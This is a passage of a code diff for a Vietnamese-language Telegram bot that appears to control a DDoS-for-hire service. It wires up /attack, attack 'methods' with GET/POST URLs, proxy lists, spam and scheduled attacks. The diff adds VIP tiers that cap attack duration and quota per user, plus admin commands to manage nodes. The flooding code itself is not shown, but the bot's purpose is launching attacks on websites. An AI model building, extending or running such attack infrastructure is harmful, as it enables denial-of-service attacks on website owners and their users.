+            can_schedule = int(context.args[4]) if len(context.args) > 4 else 1
+        except: return await update.message.reply_text("⚠️ <b>Lỗi:</b> Thông số nhập vào phải là số nguyên.", parse_mode='HTML')
+        
+        db_query('REPLACE INTO vip_users (user_id, max_time, quota, can_spam, can_schedule) VALUES (?, ?, ?, ?, ?)', (uid, max_time, quota, can_spam, can_schedule))
+        spam_txt = "BẬT" if can_spam else "TẮT"
+        sch_txt = "BẬT" if can_schedule else "TẮT"
+        await update.message.reply_text(f"✅ <b>Đã cấu hình VIP thành công:</b>\n├ ID: <code>{uid}</code>\n├ Thời gian Max: <code>{max_time}s/Lần</code>\n├ Tổng lượt: <code>{quota}</code> lượt\n├ Quyền Spam: <code>{spam_txt}</code>\n└ Quyền Đặt Lịch: <code>{sch_txt}</code>", parse_mode='HTML')
+    
     elif action == "remove":
+        try: uid = int(context.args[0])
+        except: return await update.message.reply_text("⚠️ <b>ID không hợp lệ.</b>", parse_mode='HTML')
         db_query('DELETE FROM vip_users WHERE user_id=?', (uid,))
-        await update.message.reply_text(f"❌ <b>Đã xóa VIP của:</b> <code>{uid}</code>", parse_mode='HTML')
+        await update.message.reply_text(f"❌ <b>Đã gỡ quyền VIP của:</b> <code>{uid}</code>", parse_mode='HTML')
 
 async def them_nhom(update, context):
     if not is_admin(update.message.from_user.id): return
@@ -442,11 +628,13 @@ async def help_admin(update, context):
         " ├ 👻 <code>/botro</code> (Bật/Tắt Tàng Hình)\n"
         " ├ 🛑 <code>/pkill</code> (Clear All Node)\n"
         " └ 📊 <code>/vps</code> (Xem CPU & RAM)\n\n"
-        "📂 <b>[ DỮ LIỆU METHOD ]</b>\n"
+        "📂 <b>[ DỮ LIỆU METHOD & PROXY ]</b>\n"
+        " ├ 📄 <code>/proxies</code> (Xem các file .txt)\n"
         " ├ ➕ <code>/add [name] [GET/POST/NONE] [url]</code>\n"
         " └ ➖ <code>/del [name]</code>\n\n"
         "👥 <b>[ KIỂM SOÁT QUYỀN HẠN ]</b>\n"
-        " ├ 💎 <b>VIP:</b> <code>/vipuser [id]</code> | <code>/delvip [id]</code>\n"
+        " ├ 💎 <b>VIP:</b> <code>/vipuser [id] [time] [lượt] [spam] [sch]</code>\n"
+        " ├ 🗑 <b>Gỡ VIP:</b> <code>/delvip [id]</code>\n"
         " ├ 🏘 <b>Group:</b> <code>/addgroup [id]</code> | <code>/delgroup [id]</code>\n"
         " └ 🛡 <b>BL:</b> <code>/addblacklist [url]</code> | <code>/delblacklist [url]</code>\n━━━━━━━━━━━━━━━━━━━━━━"
     )
@@ -468,12 +656,16 @@ def main():
 
     app.add_handler(CommandHandler("start", help_group))
     app.add_handler(CommandHandler("help", help_group))
+    app.add_handler(CommandHandler("me", thong_tin_vip)) 
     app.add_handler(CommandHandler("check", check_website))
     app.add_handler(CommandHandler("methods", danh_sach_phuong_thuc))
     app.add_handler(CommandHandler("attack", tao_choi))
     
+    app.add_handler(CommandHandler("spam", bat_spam))
+    app.add_handler(CommandHandler("stopspam", tat_spam))
+    
     app.add_handler(CommandHandler("schedule", dat_lich))
-    app.add_handler(CommandHandler("delschedule", huy_lich)) # <--- Lệnh mới hủy lịch
+    app.add_handler(CommandHandler("delschedule", huy_lich))
     
     app.add_handler(CommandHandler("botro", toggle_botro))
     app.add_handler(CommandHandler("pkill", stop_process))
@@ -481,18 +673,21 @@ def main():
     app.add_handler(CommandHandler("on", bot_on))
     app.add_handler(CommandHandler("off", bot_off))
     app.add_handler(CommandHandler("vps", vps_stats))
+    app.add_handler(CommandHandler("proxies", danh_sach_proxy))
 
     app.add_handler(CommandHandler("helpadmin", help_admin))
     app.add_handler(CommandHandler("add", make_handler(them_phuong_thuc, 3, "Cú pháp: /add <name> <GET/POST/NONE> <url> ...")))
     app.add_handler(CommandHandler("del", make_handler(xoa_phuong_thuc, 1, "Cú pháp: /del <name>")))
-    app.add_handler(CommandHandler("vipuser", make_handler(quan_ly_vip_user, 1, "Cú pháp: /vipuser <uid>", "add")))
-    app.add_handler(CommandHandler("delvip", make_handler(quan_ly_vip_user, 1, "Cú pháp: /delvip <uid>", "remove")))
+    
+    app.add_handler(CommandHandler("vipuser", make_handler(quan_ly_vip_user, 3, "Cú pháp: /vipuser [id] [thời_gian_tối_đa] [tổng_số_lượt] [spam:1/0] [schedule:1/0]", "add")))
+    app.add_handler(CommandHandler("delvip", make_handler(quan_ly_vip_user, 1, "Cú pháp: /delvip [id]", "remove")))
+    
     app.add_handler(CommandHandler("addgroup", make_handler(them_nhom, 1, "Cú pháp: /addgroup <gid>")))
     app.add_handler(CommandHandler("delgroup", make_handler(xoa_nhom, 1, "Cú pháp: /delgroup <gid>")))
     app.add_handler(CommandHandler("addblacklist", make_handler(quan_ly_blacklist, 1, "Cú pháp: /addblacklist <domain>", "add")))
     app.add_handler(CommandHandler("delblacklist", make_handler(quan_ly_blacklist, 1, "Cú pháp: /delblacklist <domain>", "remove")))
     
-    print("🚀 Bot đã khởi động! (Đã thêm Hủy Lịch /delschedule)")
+    print("🚀 Bot đã khởi động! (Tích hợp phân quyền SPAM & SCHEDULE cho VIP)")
     app.run_polling()
 
 if __name__ == "__main__": main()
